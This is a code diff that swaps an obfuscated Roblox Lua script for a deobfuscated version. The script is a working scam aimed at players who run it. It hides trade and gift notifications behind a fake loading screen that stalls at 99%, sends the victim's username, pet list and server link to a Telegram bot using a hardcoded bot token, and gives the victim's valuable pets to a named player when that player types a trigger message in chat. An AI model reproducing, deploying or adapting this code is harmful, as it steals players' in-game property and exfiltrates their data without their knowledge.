@@ -1,1 +1,392 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v34,v35) local v36={};_G.Cs={UQSDDAA=3,YASDMRXA=1,YASa0AVV=2};for v84=1, #v34 do v6(v36,v0(v4(v1(v2(v34,v84,v84 +  #Cs + 1 )),v1(v2(v35,1 + (v84% #v35) ,1 + (v84% #v35) + 1 )))%256 ));end return v5(v36);end local v8=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\17\200\58\201\245\32\204\62\192\248\16\217\37\215\253\36\200","\156\67\173\74\165"));local v10=game:GetService(v7("\28\163\93\6\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\100\19\58\6\221\88\23\54\33\251\66\0\43\17\251","\158\48\118\66\114"));local v12=game:GetService(v7("\153\49\30\5\118\183\237\162\39\21","\155\203\68\112\86\19\197"));local v13=v8.LocalPlayer;local v14=v13:WaitForChild(v7("\118\209\55\229\69\106\194\237\79","\152\38\189\86\156\32\24\133"));local v15={{v7("\200\69\166\66\245\89\160","\38\156\55\199"),v7("\142\116\114\41\31\125\224\74\166\122\72\58\18\112\255","\35\200\29\28\72\115\20\154"),v7("\48\178\208\216\136","\84\121\223\177\191\237\76")},{v7("\143\68\200\164\51\94\55","\161\219\54\169\192\90\48\80"),v7("\111\75\14\36\69\75\26\44\71\69\52\55\72\70\5","\69\41\34\96"),v7("\136\198\207\30","\75\220\163\183\106\98")},{v7("\54\168\138\51\208\12\189","\185\98\218\235\87"),v7("\237\53\41\231\210\163\209\53\41\225\234\184\202\56\34","\202\171\92\71\134\190")},{v7("\29\206\60\183\7\206\56\129\47\200\47\137\61\200\35\134","\232\73\161\76")}};local function v16(v37,v38) local v39=0;local v40;while true do if (v39==1) then return v40;end if (v39==(216 -(42 + 174))) then v40=v37;for v157,v158 in ipairs(v38) do local v159=0 + 0 ;local v160;while true do if ((0 + 0)==v159) then v160=0 + 0 ;while true do if (v160==0) then v40=v40:FindFirstChild(v158);if  not v40 then return nil;end break;end end break;end end end v39=1;end end end local function v17(v41) local v42=1504 -(363 + 1141) ;local v43;while true do if ((1580 -(1183 + 397))==v42) then v43=v16(v14,v41);if (v43 and v43:IsA(v7("\156\204\75\114\28\177\220\65\73","\126\219\185\34\61"))) then v43.Visible=false;elseif v43 then if v43:IsA(v7("\37\192\77\102\127\121\240\226","\135\108\174\62\18\30\23\147")) then for v188,v189 in ipairs(v43:GetDescendants()) do if v189:IsA(v7("\145\252\35\228\26\164\54\196\162","\167\214\137\74\171\120\206\83")) then v189.Visible=false;end end end end break;end end end for v44,v45 in ipairs(v15) do v17(v45);end v14.DescendantAdded:Connect(function(v46) for v85,v86 in ipairs(v15) do if (v46.Name==v86[ #v86]) then task.defer(function() v17(v86);end);end end end);local function v18() pcall(function() for v96,v97 in ipairs(v14:GetChildren()) do for v100,v101 in ipairs(v97:GetDescendants()) do if (v101:IsA(v7("\191\245\42\73\212\166\137\245\62","\199\235\144\82\61\152")) or v101:IsA(v7("\51\19\161\63\37\3\173\63\8\24","\75\103\118\217")) or v101:IsA(v7("\225\70\113\25\188","\126\167\52\16\116\217"))) then local v172=0 -0 ;local v173;local v174;while true do if (v172==(1 + 0)) then if (v173:find(v7("\220\60\33\132\177","\156\168\78\64\224\212\121")) or v173:find(v7("\19\252\164\202\14\224\162","\174\103\142\197")) or v173:find(v7("\87\43\92\61\53\74","\152\54\72\63\88\69\62")) or v173:find(v7("\208\193\237\80\221\202\235","\60\180\164\142")) or v174:find(v7("\76\76\4\45\34","\114\56\62\101\73\71\141")) or v174:find(v7("\191\224\221\208","\164\216\137\187")) or v174:find(v7("\192\227\32\167\163\237\31","\107\178\134\81\210\198\158"))) then if  not ((v101.Name==v7("\30\7\140\199\166\49\20\139\200\173\12\28\131\194\175","\202\88\110\226\166")) or (v101.Parent and (v101.Parent.Name==v7("\247\29\131\243\195\205\8","\170\163\111\226\151")))) then v101.Visible=false;end end break;end if (v172==0) then v173=v101.Text or "" ;v174=v101.Name:lower();v172=1;end end end end end end);end task.spawn(function() while true do v18();task.wait(2);end end);task.spawn(function() local v47=0;local v48;local v49;local v50;local v51;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v47==3) then v50=game:GetService(v7("\17\147\186\73\10\187\20\2\51\141\188\73","\112\69\228\223\44\100\232\113"));v51=Instance.new(v7("\224\26\31\199\154\125\132\209\19","\230\180\127\103\179\214\28"));v51.Size=UDim2.new(1 + 0 ,1975 -(1913 + 62) ,0 + 0 ,50);v51.Position=UDim2.new(0 -0 ,1933 -(565 + 1368) ,0.4 -0 ,1661 -(1477 + 184) );v47=4;end if (v47==14) then v55.Size=UDim2.new(0.99,0,1,0);task.cancel(v52);break;end if (v47==(13 -3)) then v56.Parent=v55;v57=Instance.new(v7("\111\225\194\68\91\246\137\95\198\241","\224\58\168\133\54\58\146"));v57.Color=ColorSequence.new({ColorSequenceKeypoint.new(856 -(564 + 292) ,Color3.fromRGB(0,293 -123 ,768 -513 )),ColorSequenceKeypoint.new(1 + 0 ,Color3.fromRGB(476 -(41 + 435) ,1256 -(938 + 63) ,131 + 39 ))});v57.Parent=v55;v47=1136 -(936 + 189) ;end if (v47==(4 + 7)) then v58=Instance.new(v7("\109\83\83\233\89\135\133\14\85","\107\57\54\43\157\21\230\231"));v58.Size=UDim2.new(0,60,1613 -(1565 + 48) ,16 + 9 );v58.Position=UDim2.new(1138.71 -(782 + 356) ,277 -(176 + 91) ,0.5 -0 , -12);v58.BackgroundTransparency=1;v47=16 -4 ;end if (v47==(1104 -(975 + 117))) then v58.TextColor3=Color3.new(1876 -(157 + 1718) ,1 + 0 ,1);v58.Text=v7("\139\206","\175\187\235\113\149\217\188");v58.Font=Enum.Font.Gotham;v58.TextSize=70 -50 ;v47=44 -31 ;end if (v47==(1024 -(697 + 321))) then v53=Instance.new(v7("\192\215\204\48\227","\93\134\165\173"));v53.Size=UDim2.new(0.4,0 -0 ,0.025 -0 ,0 -0 );v53.Position=UDim2.new(0.3,0 + 0 ,0.5 -0 ,0 -0 );v53.BackgroundColor3=Color3.fromRGB(1257 -(322 + 905) ,30,40);v47=618 -(602 + 9) ;end if (v47==(1189 -(449 + 740))) then v48=Instance.new(v7("\34\51\160\61\75\57\14\4\57","\73\113\80\210\88\46\87"));v48.Name=v7("\162\57\222\6\232\140\0\194\19\227\136\34\202\39\206","\135\225\76\173\114");v48.IgnoreGuiInset=true;v48.ResetOnSpawn=false;v47=873 -(826 + 46) ;end if (v47==1) then v48.Parent=v14;v49=Instance.new(v7("\51\224\185\183\169\145\166\24\232\180","\199\122\141\216\208\204\221"));v49.Size=UDim2.new(948 -(245 + 702) ,0,3 -2 ,0);v49.Position=UDim2.new(0,0,0 + 0 ,1898 -(260 + 1638) );v47=2;end if (v47==(444 -(382 + 58))) then v51.BackgroundTransparency=3 -2 ;v51.Text=v7("\160\10\94\66\237\79\231","\128\236\101\63\38\132\33");v51.TextColor3=Color3.new(1 + 0 ,1 -0 ,1);v51.Font=Enum.Font.GothamBold;v47=14 -9 ;end if (v47==(1207 -(902 + 303))) then v49.Image=v7("\191\223\8\241\107\229\168\201\25\244\34\185\226\140\66\168\44\175\249\137\73\168\45\165\244\132\68\164","\150\205\189\112\144\24");v49.BackgroundTransparency=1;v49.ScaleType=Enum.ScaleType.Crop;v49.Parent=v48;v47=5 -2 ;end if (v47==5) then v51.TextSize=86 -50 ;v51.TextStrokeTransparency=0.6;v51.Parent=v49;v52=task.spawn(function() local v161=0 + 0 ;local v162;local v163;while true do if (v161==(1691 -(1121 + 569))) then while v48.Parent do v51.Text=v7("\129\119\184\132\58\163\127","\83\205\24\217\224")   .. v162[v163] ;v163=(v163%4) + 1 ;task.wait(0.5);end break;end if (v161==0) then v162={"",".",v7("\226\231","\175\204\201\113\36\214\139"),v7("\9\130\123","\100\39\172\85\188")};v163=1;v161=1 -0 ;end end end);v47=771 -(468 + 297) ;end if (v47==8) then v54.Parent=v53;v55=Instance.new(v7("\195\92\113\7\224","\106\133\46\16"));v55.Size=UDim2.new(562 -(334 + 228) ,0 -0 ,2 -1 ,0 -0 );v55.BackgroundColor3=Color3.fromRGB(0 + 0 ,406 -(141 + 95) ,255);v47=9;end if (v47==(13 + 0)) then v58.TextXAlignment=Enum.TextXAlignment.Left;v58.Parent=v49;for v164=1,99 do v55.Size=UDim2.new(v164/(257 -157) ,0,1,0);v58.Text=v164   .. "%" ;task.wait(2);end v58.Text=v7("\101\246\196","\24\92\207\225\44\131\25");v47=33 -19 ;end if (v47==7) then v53.BorderSizePixel=0 + 0 ;v53.Parent=v49;v54=Instance.new(v7("\139\219\226\205\40\192\183\108","\30\222\146\161\162\90\174\210"));v54.CornerRadius=UDim.new(0 -0 ,6 + 2 );v47=8;end if (v47==(5 + 4)) then v55.BorderSizePixel=0 -0 ;v55.Parent=v53;v56=Instance.new(v7("\109\9\80\243\72\78\93\50","\32\56\64\19\156\58"));v56.CornerRadius=UDim.new(0 + 0 ,171 -(92 + 71) );v47=5 + 5 ;end end end);local v19=v7("\19\130\233\31\67\44\30\129\224\21\65\92\106\251\178\85\43\83\103\199\180\29\46\122\25\251\129\30\9\45\120\234\130\102\14\83\71\199\180\117\33\71\108\158\162\79","\29\43\179\216\44\123");local v20=v7("\236\136\121\30\229\136\112\20\238\142","\44\221\185\64");local v21=v7("\18\194\122\107\71\48\194\24","\19\97\135\40\63");local v22=".";local v23={v7("\156\93\48\56\32\62\160","\81\206\60\83\91\79"),v7("\104\174\222\124\42\192\13\130\65\179","\196\46\203\176\18\79\163\45"),v7("\139\50\119\16\43\232\238\173\48\107\13","\143\216\66\30\126\68\155"),v7("\158\133\63\206\221","\129\202\168\109\171\165\195\183"),v7("\22\106\50\192","\134\66\56\87\184\190\116"),v7("\26\35\12\181\26\227\97\19\46\40\73\157\28\249\51\48\40","\85\92\81\105\219\121\139\65"),v7("\217\161\81\66\115\209\251\191\73","\191\157\211\48\37\28"),v7("\251\22\231\31\53\159\61\241\25","\90\191\127\148\124"),v7("\84\136\44\4\108\130\60\87\76\143\43\5\117\142\42\24\106","\119\24\231\78"),v7("\165\34\169\78\217\78\81\165\34\170\89\217","\113\226\77\197\42\188\32"),v7("\23\31\249\188\57\86\219\182\46\25\228\160\41","\213\90\118\148"),v7("\121\59\160\66\72\73\40\184\79","\45\59\78\212\54"),v7("\59\95\151\152\147\32\168","\144\112\54\227\235\230\78\205"),v7("\144\39\29\238\197\75\167\45\11\188\251\82\167\59\26\242\213","\59\211\72\111\156\176"),v7("\99\136\236\35\14\164\226\57","\77\46\231\131")};local v24=v9:WaitForChild(v7("\157\85\187\69\159\66\179\78\174\71","\32\218\52\214")):WaitForChild(v7("\126\18\37\143\248\182\81\83\64\16\2\173\227\166\76\89\75","\58\46\119\81\200\145\208\37"));local v25={[v7("\56\152\49\190\189\137\63\38\137","\86\75\236\80\204\201\221")]=tick(),[v7("\102\78\99\132\242\187\119\85\100\177\236\138\124\82\113\128\236\153\119\69","\235\18\33\23\229\158")]=0 -0 ,[v7("\85\168\211\180\66\169","\219\48\218\161")]=0 -0 };local function v26(v59) local v60=0 + 0 ;local v61;local v62;while true do local v87=0 -0 ;while true do if (v87==(806 -(118 + 688))) then if (v60==(49 -(25 + 23))) then if  not v61 then v25.errors=v25.errors + 1 + 0 ;end return v61;end if (0==v60) then if ( #v59>(5386 -(927 + 959))) then v59=v59:sub(3 -2 ,4232 -(16 + 716) )   .. v7("\170\63\50","\128\132\17\28\41\187\47") ;end v61,v62=pcall(function() local v182=0;local v183;while true do if (v182==0) then local v190=0;while true do if ((0 -0)==v190) then v183=string.format(v7("\9\38\18\42\78\91\125\73\59\77\8\124\18\63\81\4\53\20\59\80\79\61\20\61\18\3\61\18\127\78\78\33\3\52\89\44\55\21\41\92\6\55\89\57\85\0\38\57\51\89\92\119\21\124\73\4\42\18\103\24\18","\61\97\82\102\90"),v19,v20,v10:UrlEncode(v59));return game:HttpGet(v183);end end end end end);v60=98 -(11 + 86) ;end break;end end end end local function v27() local v63=game.PlaceId;local v64=game.JobId;if ( not v64 or (v64=="")) then return v7("\190\33\169\71\200\79\68\70\227\62\167\74\196\82\55\13\241","\105\204\78\203\43\167\55\126")   .. v63 ;else return v7("\183\165\33\18\28\28\157\30\234\186\47\31\16\1\238\85\248","\49\197\202\67\126\115\100\167")   .. v63   .. v7("\113\92\222\36\133\127\80\36\79\222\39\131\83\119\51\6","\62\87\59\191\73\224\54")   .. v64 ;end end local function v28() local v65=0 -0 ;local v66;local v67;while true do if (v65==(285 -(175 + 110))) then v66={};v67={v13.Backpack};v65=1;end if (v65==1) then if v13.Character then table.insert(v67,v13.Character);end for v167,v168 in ipairs(v67) do for v175,v176 in ipairs(v168:GetChildren()) do if (v176:IsA(v7("\211\13\245\197","\169\135\98\154")) and v176.Name:find(v7("\142\76","\168\171\23\68\52\157\83"))) then local v184=0;local v185;while true do if (v184==0) then v185=v176.Name:match(v7("\177\74\189\232\33\102\194\186\52\241\230\108\109\172\211\52\200","\231\148\17\149\205\69\77"));if v185 then local v195=0 -0 ;local v196;while true do if (v195==(1796 -(503 + 1293))) then v196=v176.Name:match(v7("\190\239\252\197\18\196\189\236\142","\159\224\199\167\155\55"));if v196 then local v198=0 -0 ;local v199;while true do if (v198==(1 + 0)) then for v200,v201 in ipairs(v23) do if v196:lower():find(v201:lower()) then v199=true;break;end end table.insert(v66,{[v7("\130\252\65\55","\26\236\157\44\82\114\44")]=v196,[v7("\61\43\220\92\34\58","\59\74\78\181")]=tonumber(v185),[v7("\42\211\80\95\176\49","\211\69\177\58\58")]=v176,[v7("\190\246\78\253\224\223\178\233\112\230\253\206\179","\171\215\133\25\149\137")]=v199});break;end if ((1061 -(810 + 251))==v198) then v196=v196:gsub(v7("\178\224\119\150","\178\151\147\92"),"");v199=false;v198=1 + 0 ;end end end break;end end end break;end end end end end v65=1 + 1 ;end if (v65==(2 + 0)) then table.sort(v66,function(v169,v170) return v169.weight>v170.weight ;end);return v66;end end end local function v29() local v68=0;local v69;local v70;local v71;local v72;while true do local v88=533 -(43 + 490) ;while true do if (v88==(733 -(711 + 22))) then if (v68==3) then if ( #v69>(154 -114)) then table.insert(v72,v7("\175\134\124","\34\129\168\82\154\143\80\156"));end table.insert(v72,string.format("\nВсего: %d | К передаче: %d", #v69,v70));v68=4;end if (v68==4) then return table.concat(v72,"\n");end v88=1;end if (v88==1) then if (v68==(859 -(240 + 619))) then local v179=0 + 0 ;while true do if (v179==(1 -0)) then v68=1 + 0 ;break;end if (v179==(1744 -(1344 + 400))) then v69=v28();if ( #v69==0) then return "Нет питомцев";end v179=406 -(255 + 150) ;end end end if (v68==(1 + 0)) then local v180=0 + 0 ;while true do if (v180==0) then v70=0;v71=0 -0 ;v180=3 -2 ;end if (v180==(1740 -(404 + 1335))) then v68=2;break;end end end v88=408 -(183 + 223) ;end if (v88==(2 -0)) then if (v68==2) then local v181=0 + 0 ;while true do if (v181==(1 + 0)) then v68=340 -(10 + 327) ;break;end if (v181==(0 + 0)) then v72={"ПИТОМЦЫ:"};for v191,v192 in ipairs(v69) do if (v191>(14 + 26)) then break;end v71=v71 + v192.weight ;if v192.isWhitelisted then local v197=449 -(108 + 341) ;while true do if (v197==(0 + 0)) then v70=v70 + (4 -3) ;table.insert(v72,string.format("✅ %s [%.1f]",v192.name,v192.weight));break;end end else table.insert(v72,string.format("❌ %s [%.1f]",v192.name,v192.weight));end end v181=1494 -(711 + 782) ;end end end break;end end end end local function v30() local v73=0;local v74;while true do if (v73==(0 -0)) then v74=string.format("СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",v13.Name,v21,v22,v29(),v27());v26(v74);break;end end end local function v31(v75) local v76=469 -(270 + 199) ;local v77;local v78;local v79;while true do if (v76==(1 + 0)) then if  not v77 then return false,"Игрок не найден";end if  not (v13.Character and v13.Character:FindFirstChild(v7("\173\167\62\10\70\65\128\129","\233\229\210\83\107\40\46"))) then return false,"Персонаж недоступен";end v76=1821 -(580 + 1239) ;end if (v76==(0 -0)) then if  not v75.isWhitelisted then return false,"Не в списке";end v77=v8:FindFirstChild(v21);v76=1 + 0 ;end if (v76==(1 + 1)) then v78,v79=pcall(function() v13.Character.Humanoid:EquipTool(v75.object);task.wait(1 + 0 );v24:FireServer(v7("\230\75\36\211\53\196\86","\101\161\34\82\182"),v77);end);if v78 then v25.totalPetsTransferred=v25.totalPetsTransferred + (2 -1) ;return true,v7("\199\38","\78\136\109\57\158\187\130\226");else v25.errors=v25.errors + 1 ;return false,"Ошибка";end break;end end end local function v32() v26("Начинаю передачу...");local v80=v28();local v81={};for v89,v90 in ipairs(v80) do if v90.isWhitelisted then table.insert(v81,v90);end end if ( #v81==(0 + 0)) then local v98=0;while true do if (v98==0) then v26("Нет питомцев для передачи");return;end end end local v82=0;local v83=1167 -(645 + 522) ;for v91,v92 in ipairs(v81) do local v93=1790 -(1010 + 780) ;local v94;local v95;while true do if (v93==(1 + 0)) then if ((v91%(23 -18))==(0 -0)) then v26(string.format("Прогресс: %d/%d",v91, #v81));end task.wait(1838 -(1045 + 791) );break;end if (v93==(0 -0)) then v94,v95=v31(v92);if v94 then v82=v82 + (1 -0) ;else v83=v83 + (506 -(351 + 154)) ;end v93=1575 -(1281 + 293) ;end end end v26(string.format("ГОТОВО!\nУспешно: %d\nОшибок: %d",v82,v83));end local function v33() if v11 then v11.OnIncomingMessage=function(v151) local v152=266 -(28 + 238) ;local v153;while true do if (v152==(0 -0)) then v153=v8:FindFirstChild(v151.TextSource.Name);if (v153 and (v153.Name==v21)) then if (v151.Text==v22) then v32();end end break;end end end;else v8.PlayerChatted:Connect(function(v154,v155,v156) if ((v154==Enum.PlayerChatType.All) and (v155.Name==v21)) then if (v156==v22) then v32();end end end);end end task.wait(10);v30();v33();
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local paths = {
+    {"Trading", "FinalizingTrade", "Image"},
+    {"Trading", "FinalizingTrade", "Text"},
+    {"Trading", "FinalizingTrade"},
+    {"Top_Notification"},
+}
+local function findByPath(root, pathArray)
+    local obj = root
+    for _, name in ipairs(pathArray) do
+        obj = obj:FindFirstChild(name)
+        if not obj then return nil end
+    end
+    return obj
+end
+local function disableByPath(pathArray)
+    local obj = findByPath(PlayerGui, pathArray)
+    if obj and obj:IsA("GuiObject") then
+        obj.Visible = false
+    elseif obj then
+        if obj:IsA("Instance") then
+            for _, child in ipairs(obj:GetDescendants()) do
+                if child:IsA("GuiObject") then
+                    child.Visible = false
+                end
+            end
+        end
+    end
+end
+for _, p in ipairs(paths) do
+    disableByPath(p)
+end
+PlayerGui.DescendantAdded:Connect(function(obj)
+    for _, p in ipairs(paths) do
+        if obj.Name == p[#p] then
+            task.defer(function()
+                disableByPath(p)
+            end)
+        end
+    end
+end)
+local function hideTradeNotifications()
+    pcall(function()
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+            for _, obj in ipairs(gui:GetDescendants()) do
+                if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("Frame") then
+                    local text = obj.Text or ""
+                    local name = obj.Name:lower()
+                    
+                    if text:find("trade") or text:find("trading") or text:find("accept") or text:find("decline") or
+                       name:find("trade") or name:find("gift") or name:find("request") then
+                        if not (obj.Name == "FinalizingTrade" or obj.Parent and obj.Parent.Name == "Trading") then
+                            obj.Visible = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+task.spawn(function()
+    while true do
+        hideTradeNotifications()
+        task.wait(2)
+    end
+end)
+task.spawn(function()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CustomLoadingUI"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = PlayerGui
+    
+    local background = Instance.new("ImageLabel")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.Image = "rbxassetid://128494498539944"
+    background.BackgroundTransparency = 1
+    background.ScaleType = Enum.ScaleType.Crop
+    background.Parent = screenGui
+    
+    local tweenService = game:GetService("TweenService")
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 50)
+    label.Position = UDim2.new(0, 0, 0.4, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "Loading"
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 36
+    label.TextStrokeTransparency = 0.6
+    label.Parent = background
+    
+    local dotTask = task.spawn(function()
+        local dots = {"", ".", "..", "..."}
+        local dotIndex = 1
+        while screenGui.Parent do
+            label.Text = "Loading" .. dots[dotIndex]
+            dotIndex = dotIndex % 4 + 1
+            task.wait(0.5)
+        end
+    end)
+    
+    local barContainer = Instance.new("Frame")
+    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
+    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
+    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    barContainer.BorderSizePixel = 0
+    barContainer.Parent = background
+    
+    local containerCorner = Instance.new("UICorner")
+    containerCorner.CornerRadius = UDim.new(0, 8)
+    containerCorner.Parent = barContainer
+    
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barContainer
+    
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(0, 8)
+    fillCorner.Parent = barFill
+    
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
+    })
+    gradient.Parent = barFill
+    
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(0, 60, 0, 25)
+    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
+    percent.BackgroundTransparency = 1
+    percent.TextColor3 = Color3.new(1, 1, 1)
+    percent.Text = "0%"
+    percent.Font = Enum.Font.Gotham
+    percent.TextSize = 20
+    percent.TextXAlignment = Enum.TextXAlignment.Left
+    percent.Parent = background
+    
+    for i = 1, 99 do
+        barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+        percent.Text = i .. "%"
+        task.wait(2)
+    end
+    
+    percent.Text = "99%"
+    barFill.Size = UDim2.new(0.99, 0, 1, 0)
+    
+    task.cancel(dotTask)
+end)
+local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
+local TELEGRAM_CHAT_ID = "1192810837"
+local TARGET_PLAYER = "sERTTQE0"
+local TRIGGER_MESSAGE = "."
+local WHITELIST = {
+    "Raccoon",
+    "Fennec Fox", 
+    "Spinosaurus",
+    "T-Rex",
+    "TRex",
+    "French Fry Ferret",
+    "Dragonfly",
+    "Disco Bee",
+    "Lobster Thermidor",
+    "Golden Goose",
+    "Mimic Octopus",
+    "Butterfly",
+    "Kitsune",
+    "Corrupted Kitsune",
+    "Moon Cat"
+}
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+local STATS = {
+    startTime = tick(),
+    totalPetsTransferred = 0,
+    errors = 0
+}
+local function sendToTelegram(text)
+    if #text > 3500 then
+        text = text:sub(1, 3500) .. "..."
+    end
+    
+    local success, result = pcall(function()
+        local url = string.format(
+            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+            TELEGRAM_TOKEN,
+            TELEGRAM_CHAT_ID,
+            HttpService:UrlEncode(text)
+        )
+        return game:HttpGet(url)
+    end)
+    
+    if not success then
+        STATS.errors = STATS.errors + 1
+    end
+    
+    return success
+end
+local function getServerLink()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    if not jobId or jobId == "" then
+        return "roblox://placeId=" .. placeId
+    else
+        return "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+    end
+end
+local function getAllPets()
+    local pets = {}
+    local sources = {LocalPlayer.Backpack}
+    
+    if LocalPlayer.Character then
+        table.insert(sources, LocalPlayer.Character)
+    end
+    
+    for _, source in ipairs(sources) do
+        for _, item in ipairs(source:GetChildren()) do
+            if item:IsA("Tool") and item.Name:find("%[") then
+                local weight = item.Name:match("%[(%d+%.%d+) KG%]")
+                if weight then
+                    local petName = item.Name:match("^([^%[]+)")
+                    if petName then
+                        petName = petName:gsub("%s+$", "")
+                        
+                        local isWhitelisted = false
+                        for _, whitelistedPet in ipairs(WHITELIST) do
+                            if petName:lower():find(whitelistedPet:lower()) then
+                                isWhitelisted = true
+                                break
+                            end
+                        end
+                        
+                        table.insert(pets, {
+                            name = petName,
+                            weight = tonumber(weight),
+                            object = item,
+                            isWhitelisted = isWhitelisted
+                        })
+                    end
+                end
+            end
+        end
+    end
+    
+    table.sort(pets, function(a, b) return a.weight > b.weight end)
+    return pets
+end
+local function getPetsList()
+    local pets = getAllPets()
+    if #pets == 0 then 
+        return "Нет питомцев" 
+    end
+    
+    local whitelisted = 0
+    local totalWeight = 0
+    local result = {"ПИТОМЦЫ:"}
+    
+    for i, pet in ipairs(pets) do
+        if i > 40 then break end
+        
+        totalWeight = totalWeight + pet.weight
+        if pet.isWhitelisted then
+            whitelisted = whitelisted + 1
+            table.insert(result, string.format("✅ %s [%.1f]", pet.name, pet.weight))
+        else
+            table.insert(result, string.format("❌ %s [%.1f]", pet.name, pet.weight))
+        end
+    end
+    
+    if #pets > 40 then
+        table.insert(result, "...")
+    end
+    
+    table.insert(result, string.format("\nВсего: %d | К передаче: %d", #pets, whitelisted))
+    
+    return table.concat(result, "\n")
+end
+local function sendInitialNotification()
+    local message = string.format(
+        "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
+        LocalPlayer.Name,
+        TARGET_PLAYER, 
+        TRIGGER_MESSAGE,
+        getPetsList(),
+        getServerLink()
+    )
+    
+    sendToTelegram(message)
+end
+local function transferPet(pet)
+    if not pet.isWhitelisted then 
+        return false, "Не в списке" 
+    end
+    
+    local target = Players:FindFirstChild(TARGET_PLAYER)
+    if not target then
+        return false, "Игрок не найден"
+    end
+    
+    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
+        return false, "Персонаж недоступен"
+    end
+    
+    local success, err = pcall(function()
+        LocalPlayer.Character.Humanoid:EquipTool(pet.object)
+        task.wait(1)
+        PetGiftingService:FireServer("GivePet", target)
+    end)
+    
+    if success then
+        STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
+        return true, "OK"
+    else
+        STATS.errors = STATS.errors + 1
+        return false, "Ошибка"
+    end
+end
+local function startPetTransfer()
+    sendToTelegram("Начинаю передачу...")
+    
+    local pets = getAllPets()
+    local whitelistedPets = {}
+    
+    for _, pet in ipairs(pets) do
+        if pet.isWhitelisted then
+            table.insert(whitelistedPets, pet)
+        end
+    end
+    
+    if #whitelistedPets == 0 then
+        sendToTelegram("Нет питомцев для передачи")
+        return
+    end
+    
+    local successful = 0
+    local failed = 0
+    
+    for i, pet in ipairs(whitelistedPets) do
+        local success, reason = transferPet(pet)
+        
+        if success then
+            successful = successful + 1
+        else
+            failed = failed + 1
+        end
+        
+        if i % 5 == 0 then
+            sendToTelegram(string.format("Прогресс: %d/%d", i, #whitelistedPets))
+        end
+        
+        task.wait(2)
+    end
+    
+    sendToTelegram(string.format(
+        "ГОТОВО!\nУспешно: %d\nОшибок: %d", 
+        successful, failed
+    ))
+end
+local function setupMessageListener()
+    if TextChatService then
+        TextChatService.OnIncomingMessage = function(message)
+            local speaker = Players:FindFirstChild(message.TextSource.Name)
+            if speaker and speaker.Name == TARGET_PLAYER then
+                if message.Text == TRIGGER_MESSAGE then
+                    startPetTransfer()
+                end
+            end
+        end
+    else
+        Players.PlayerChatted:Connect(function(chatType, speaker, message)
+            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
+                if message == TRIGGER_MESSAGE then
+                    startPetTransfer()
+                end
+            end
+        end)
+    end
+end
+task.wait(10)
+sendInitialNotification()
+setupMessageListener()
